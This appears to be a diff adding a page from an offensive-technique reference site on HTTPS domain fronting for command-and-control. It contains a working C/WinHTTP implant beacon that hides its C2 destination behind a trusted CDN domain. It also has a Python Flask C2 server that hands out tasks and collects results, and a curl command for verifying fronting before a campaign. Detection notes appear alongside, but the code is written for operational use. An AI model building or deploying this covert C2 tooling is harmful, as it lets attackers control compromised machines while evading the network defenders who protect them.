@@ -1,0 +1,211 @@
+---
+title: HTTPS Domain Fronting
+mitre: T1090.004
+category: c2
+group: Covert Channels
+summary: Route C2 traffic through a trusted CDN provider so network defenders see connections to a legitimate host while traffic reaches the attacker's server.
+platform: [Windows, Linux, macOS]
+tags: ['Python', 'C / C++', 'HTTPS']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: select a CDN that allows header mismatch
+    desc: The CDN SNI and HTTP Host header must be allowed to differ. Cloudfront, Azure CDN, and Fastly have historically permitted this.
+    dll: —
+  - call: register a domain on the same CDN as a legitimate service
+    desc: The fronted domain (e.g. d111111abcdef8.cloudfront.net) must be on the same CDN PoP as a well-known domain used as the SNI.
+    dll: —
+  - call: TLS handshake to the CDN with the legitimate domain as SNI
+    desc: Network sensors see the SNI field containing a trusted domain (e.g. allowed.example.com). TLS is terminated at the CDN PoP.
+    dll: winhttp / libcurl
+  - call: HTTP Host header points to attacker's CDN domain
+    desc: Inside the encrypted TLS tunnel, the Host header directs the CDN to forward the request to the attacker's origin server.
+    dll: —
+  - call: CDN forwards request to C2 origin
+    desc: The CDN acts as a transparent proxy; the HTTP response from the C2 travels back the same way.
+    dll: —
+detections:
+  - src: NETWORK
+    text: TLS SNI does not match the HTTP Host header inside the encrypted session — requires TLS inspection (MITM proxy).
+  - src: NETWORK
+    text: DNS query for a trusted domain followed by a connection to a CDN PoP IP, but no subsequent connections to the expected origin IPs of that domain.
+  - src: THREAT INTEL
+    text: The CDN distribution ID or origin domain appears in known C2 IoC feeds while traffic is going to a trusted CDN IP.
+  - src: BEHAVIOURAL
+    text: Beacon with fixed-period HTTPS requests to a CDN edge, with no browsing behaviour and no cache-hit headers.
+related:
+  - mitre: T1071.001
+    title: HTTP Beaconing
+    desc: Standard HTTP/S beaconing without CDN fronting — simpler but easier to block.
+    href: /techniques/c2/http-beaconing
+  - mitre: T1071.004
+    title: DNS Beaconing
+    desc: DNS-based alternative when HTTPS is filtered.
+    href: /techniques/c2/dns-beaconing
+  - mitre: T1008
+    title: Fallback Channels
+    desc: Domain fronting is often used as the high-resilience fallback channel.
+labKit:
+  - label: Cobalt Strike malleable profiles with front domains
+    href: 'https://github.com/bluscreenofdeath/MalleableProfiles'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Domain fronting abuses the architecture of large Content Delivery Networks. A CDN routes requests based on the **HTTP Host header** inside the TLS tunnel, but the TLS handshake itself uses the **SNI extension** to select a certificate. Because SNI and Host can point to different domains on the same CDN, an attacker can:
+
+1. Set SNI to `allowed.trusted-cdn-customer.com` — a domain that passes allowlisting.
+2. Set the HTTP Host header to `c2-origin.attacker-cdn-subdomain.com` — the actual C2 destination.
+
+Network sensors see TLS traffic to a well-known, trusted domain. The CDN decrypts the TLS session at its edge, reads the Host header, and proxies the request to the C2 origin server. No sensor between the implant and the CDN PoP sees the real destination.
+
+<Callout type="caution">
+  Major CDN providers have progressively closed domain fronting. AWS CloudFront blocked it in 2018,
+  Google GCP in 2018, and Azure CDN tightened controls in 2022. As of 2025, practical domain
+  fronting requires finding CDN configurations that still permit Host header mismatch, or using
+  alternative techniques such as domain hiding (fronting via the same CDN customer's domains).
+  Always verify the current CDN policy before building a campaign around this technique.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Implant-side HTTP request with domain fronting (C/WinHTTP)
+
+<CodeBlock
+  file="domain_front.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+#include <winhttp.h>
+#pragma comment(lib, "winhttp.lib")
+
+// SNI domain (passes network inspection) vs Host (real CDN destination)
+#define FRONT_DOMAIN  L"legitimate.cloudfront-customer.com"  // SNI
+#define HOST_HEADER   L"c2.attacker-distribution.cloudfront.net"  // Host
+#define C2_PATH       L"/check-in"
+
+BOOL send_fronted_beacon(const BYTE *body, DWORD body_len) {
+    // Open session — SNI is determined by the connection target
+    HINTERNET session = WinHttpOpen(L"Mozilla/5.0",
+        WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
+    if (!session) return FALSE;
+
+    // Connect to the FRONT domain — this sets the SNI in the TLS handshake
+    HINTERNET conn = WinHttpConnect(session, FRONT_DOMAIN, INTERNET_DEFAULT_HTTPS_PORT, 0);
+    HINTERNET req  = WinHttpOpenRequest(conn, L"POST", C2_PATH,
+        NULL, WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);
+
+    // Override the Host header inside the TLS tunnel to reach the C2 origin
+    wchar_t host_hdr[256];
+    swprintf_s(host_hdr, 256, L"Host: %s", HOST_HEADER);
+    WinHttpAddRequestHeaders(req, host_hdr, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_REPLACE);
+
+    // Add a realistic Content-Type to blend with legitimate traffic
+    WinHttpAddRequestHeaders(req, L"Content-Type: application/octet-stream",
+        (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
+
+    BOOL ok = WinHttpSendRequest(req, NULL, 0, (PVOID)body, body_len, body_len, 0);
+    if (ok) WinHttpReceiveResponse(req, NULL);
+
+    WinHttpCloseHandle(req);
+    WinHttpCloseHandle(conn);
+    WinHttpCloseHandle(session);
+    return ok;
+}`}
+/>
+
+### Python C2 handler (origin server side)
+
+<CodeBlock
+  file="c2_origin.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`from flask import Flask, request, jsonify
+import base64, json, uuid
+
+app = Flask(__name__)
+BEACONS = {}  # beacon_id -> {checkin_time, tasks}
+
+@app.route('/check-in', methods=['POST'])
+def checkin():
+    # The CDN forwards the real client IP in X-Forwarded-For
+    implant_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+    beacon_id = request.headers.get('X-Beacon-Id', str(uuid.uuid4()))
+    BEACONS.setdefault(beacon_id, {'ip': implant_ip, 'tasks': []})
+
+    # Return pending task or NOP
+    tasks = BEACONS[beacon_id].get('tasks', [])
+    task  = tasks.pop(0) if tasks else {'type': 'nop'}
+    return jsonify({'task': task, 'id': beacon_id})
+
+@app.route('/result', methods=['POST'])
+def result():
+    data = request.get_json()
+    print(f"[+] Result from {data.get('id')}: {data.get('output')}")
+    return jsonify({'status': 'ok'})
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')`}
+/>
+
+### Verify fronting works before deployment
+
+<CodeBlock
+  file="verify_front.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Test: connect to FRONT_DOMAIN with SNI, send Host header for C2 domain
+# If the CDN allows mismatch, you will receive a response from the C2 origin.
+
+curl -v \
+  --resolve "legitimate.cloudfront-customer.com:443:99.84.x.y" \
+  -H "Host: c2.attacker-distribution.cloudfront.net" \
+  "https://legitimate.cloudfront-customer.com/check-in"
+
+# Expected: 200 OK from your origin server
+# Blocked:  403 Forbidden or "Mismatch" error from CDN`}
+/>
+
+## CDN provider status (as of 2025)
+
+| Provider | Fronting status | Notes |
+|---|---|---|
+| AWS CloudFront | Blocked (2018) | SNI/Host mismatch returns 403 |
+| Azure CDN | Largely blocked (2022) | Some legacy configs may still work |
+| Google Cloud CDN | Blocked (2018) | Same-customer fronting still possible in some regions |
+| Fastly | Partially blocked | Edge dictionary rules can detect mismatch |
+| Cloudflare | Customer-controlled | Workers can forward arbitrarily; detection depends on config |
+| Oracle CDN | Less monitored | Smaller CDN; policies change without announcement |
+
+## Domain hiding (modern alternative)
+
+Instead of a Host mismatch, domain hiding uses a legitimate sub-domain of a target organization that happens to be hosted on the same CDN as the attacker. The SNI and Host both point to the legitimate domain, but the attacker has configured their CDN distribution to respond to the same requests. From a network perspective, all traffic appears to go to the legitimate domain.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+Without TLS inspection, domain fronting is nearly invisible. TLS inspection (decryption at a proxy or firewall) reveals the Host header mismatch. Organisations running network TLS decryption will see the SNI vs Host discrepancy immediately — but most consumer environments and many enterprise environments do not inspect TLS.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
